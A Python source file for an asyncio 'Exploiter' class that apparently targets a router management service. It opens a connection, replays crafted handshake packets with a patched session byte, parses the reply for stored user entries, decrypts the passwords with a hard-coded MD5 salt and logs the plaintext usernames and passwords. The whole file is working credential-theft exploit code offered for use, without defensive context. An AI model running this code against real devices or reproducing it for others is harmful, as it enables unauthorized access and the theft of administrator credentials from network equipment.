import asyncio
import hashlib
from typing import List, Tuple

from loguru import logger

from app.templates import hello, template


class Exploiter:
    def __init__(self, address: str, port: int):
        self.address = address
        self.port = port

    async def _connect(self):
        try:
            self.reader, self.writer = await asyncio.open_connection(
                self.address, self.port
            )
        except Exception as error:
            logger.error(f"Connection error: {error}")
            self.writer.close()
            await self.writer.wait_closed()

    async def _get_session_id(self) -> bytearray:
        try:
            self.writer.write(hello)
            session_id = bytearray(await self.reader.read(1024))
            return session_id
        except Exception as error:
            logger.error(f"Can't get session id from {self.address}! Error: {error}")
            self.writer.close()
            await self.writer.wait_closed()

    async def _send_edited_response(self, session_id: bytearray) -> bytearray:
        template[19] = session_id[38]
        try:
            self.writer.write(template)
            return bytearray(await self.reader.read(1024))
        except Exception as error:
            logger.error(
                f"Can't send edited response from {self.address}! Error: {error}"
            )
            self.writer.close()
            await self.writer.wait_closed()

    def _decrypt_password(self, user, pass_enc):
        key = hashlib.md5(user + b"283i4jfkai3389").digest()
        passw = ""
        for i in range(0, len(pass_enc)):
            passw += chr(pass_enc[i] ^ key[i % len(key)])
        return passw.split("\x00")[0]

    def _extract_user_pass_from_entry(self, entry) -> Tuple:
        user_data = entry.split(b"\x01\x00\x00\x21")[1]
        pass_data = entry.split(b"\x11\x00\x00\x21")[1]
        user_len = user_data[0]
        pass_len = pass_data[0]
        username = user_data[1 : 1 + user_len]
        password = pass_data[1 : 1 + pass_len]
        return username, password

    def _get_pair(self, data) -> List[Tuple]:
        user_list = []
        entries = data.split(b"M2")[1:]
        for entry in entries:
            try:
                user, pass_encrypted = self._extract_user_pass_from_entry(entry)
            except Exception as error:
                logger.error(
                    f"Error while decrypting username and password from {self.address}! {error}"
                )
                continue
            pass_plain = self._decrypt_password(user, pass_encrypted)
            user = user.decode("utf_8", "backslashreplace")
            user_list.append((user, pass_plain))
        return user_list

    def _get_username_and_password(self, result: bytearray):
        user_pass: List[Tuple] = self._get_pair(result)
        for u, p in user_pass:
            logger.success(
                f"Host {self.address}:{self.port} has username: {u} and password: {p}"
            )

    async def crack(self):
        try:
            await self._connect()
            session_id = await self._get_session_id()
            if session_id:
                result = await self._send_edited_response(session_id=session_id)
                self._get_username_and_password(result=result)
        finally:
            self.writer.close()
            await self.writer.wait_closed()